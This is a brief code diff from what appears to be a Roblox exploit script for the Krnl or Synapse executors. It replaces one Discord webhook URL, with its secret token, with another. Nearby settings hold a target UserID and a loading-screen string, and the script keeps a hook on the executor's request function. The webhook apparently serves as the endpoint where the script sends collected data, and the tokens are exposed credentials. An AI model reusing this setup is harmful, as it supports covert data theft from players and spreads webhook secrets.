@@ -1,5 +1,5 @@
 _G.UserID = 1690659151
-_G.WebHook = "https://discord.com/api/webhooks/1062639845740126248/2V0ysMFDC1thdXGIJmP95YFHfRibHK7znRDCYpaSUzpC9Aqcj3SxqVx7ZljmBzfOD_cX"
+_G.WebHook = "https://discord.com/api/webhooks/1062641140672770058/JLhjwqOolpXskEGwrGrLM0KdWpNPuCmOYOiMgBwxHT6mzwII4TojIKa8LL9FXoZpkCqQ"
 _G.LoadingScreenText = "Here!!"
 if Krnl then syn = Krnl end
 local Old = syn.request
